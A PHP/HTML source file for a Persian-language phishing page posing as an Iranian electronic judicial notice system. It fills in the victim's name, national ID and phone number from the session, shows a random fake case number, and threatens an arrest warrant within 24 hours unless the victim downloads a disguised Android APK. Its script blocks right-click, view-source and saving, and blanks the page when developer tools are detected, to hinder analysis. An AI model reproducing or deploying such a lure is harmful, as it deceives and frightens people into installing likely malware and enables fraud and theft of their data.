<?php
session_start();

$fullname   = $_SESSION['name']   ?? '';
$armxan_CM  = $_SESSION['cm']     ?? '';
$number     = $_SESSION['number'] ?? '';

$trackingCode = rand(1000000000, 9999999999);

$caseNumberFull = rand(100000000000, 999999999999); // یه شماره کامل
$caseMasked = substr($caseNumberFull, 0, 2) . str_repeat('*', 6) . substr($caseNumberFull, -4);

date_default_timezone_set('Asia/Tehran');
$now = new DateTime();
$fmt = new IntlDateFormatter(
    'fa_IR@calendar=persian',
    IntlDateFormatter::SHORT,
    IntlDateFormatter::NONE,
    'Asia/Tehran',
    IntlDateFormatter::TRADITIONAL,
    'yyyy/MM/dd'
);
$today = $fmt->format($now);
?>
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>سامانه ابلاغیه الکترونیکی</title>

  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/shabnam-font@v5.0.1/dist/font-face.css" rel="stylesheet">

  <style>
    body {
      font-family: 'Shabnam', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f7f9fc;
      direction: rtl;
    }

    .header {
      background: url('gg.png') no-repeat center top;
      background-size: cover;
      height: 55.5px;
      position: relative;
    }

    .logo {
      background: white;
      border-radius: 50%;
      padding: 4px;
      width: 44px;
      height: 44px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      bottom: -27.5px;
      box-shadow: 0 0 6px rgba(0,0,0,0.05);
    }

    .logo img {
      width: 36px;
      height: 36px;
    }

    .container {
      max-width: 400px;
      margin: 50px auto 30px;
      padding: 0 20px;
    }

    .notice {
      background: #fff4e5;
      border: 1px solid #ffe0b2;
      color: #333;
      padding: 10px;
      border-radius: 6px;
      font-size: 14px;
      text-align: center;
      margin-bottom: 15px;
    }

    .card {
      background: #fff;
      padding: 15px;
      border-radius: 10px;
      box-shadow: 0 0 6px rgba(0,0,0,0.08);
      font-size: 14px;
      line-height: 1.8;
    }

    .card h2 {
      font-size: 16px;
      margin-top: 0;
      color: #002366;
      text-align: center;
    }

    .info p {
      margin: 4px 0;
    }

    .warning {
      color: #d32f2f;
      font-weight: bold;
      margin-top: 12px;
      font-size: 13px;
      line-height: 1.7;
    }

    .btn-download {
      display: block;
      margin: 20px auto 0;
      padding: 12px;
      background-color: #002366;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      text-align: center;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="header">
    <div class="logo">
      <img src="logo.png" alt="logo">
    </div>
  </div>

  <div class="container">
    <div class="notice">
      اطلاعیه: شکایت جدیدی علیه شما ثبت شده است.
    </div>

    <div class="card">
      <h2>اطلاعات پرونده</h2>
      <div class="info">
        <p><b>نام و نام خانوادگی :</b> <?=htmlspecialchars($fullname)?></p>
        <p><b>کدملی : </b> <?=htmlspecialchars($armxan_CM)?></p>
        <p><b>شماره همراه : </b> <?=htmlspecialchars($number)?></p>
        <p><b>کد رهگیری : </b> <?=$trackingCode?></p>
        <p><b>شماره پرونده : </b> <?=$caseMasked?></p>
        <p><b>تاریخ ابلاغیه : </b> <?=$today?></p>
      </div>

      <p>
        جناب آقا/خانم <?=htmlspecialchars($fullname)?>، شکایتی علیه شما ثبت شده است. لذا خواهشمند است جهت پیگیری و بررسی شکایـه خود از طریق گزینه زیر جهت دانلود اپلیکیشن سامانه ابلاغیه اقدام کنید.
      </p>

      <p class="warning">
        توجه: هرگونه عدم پیگیری طی ۲۴ ساعت آینده، پیگیری قانونی در پی خواهد داشت، و حکم جلب شما صادر خواهد شد.
      </p>

      <a href="app/app.apk" class="btn-download" download>دانلود اپلیکیشن</a>
    </div>
  </div>


<script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', function(e){
    if(
        e.keyCode === 123 || 
        (e.ctrlKey && e.keyCode === 85) || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
        (e.ctrlKey && e.keyCode === 83)
    ){
        e.preventDefault();
        return false;
    }
});
document.addEventListener('selectstart', e => e.preventDefault());

// basic devtools detect (weak)
setInterval(function(){
    const before = Date.now();
    debugger;
    const after = Date.now();
    if(after - before > 100){
        document.body.innerHTML = "";
    }
}, 2000);
</script>

</body>
</html>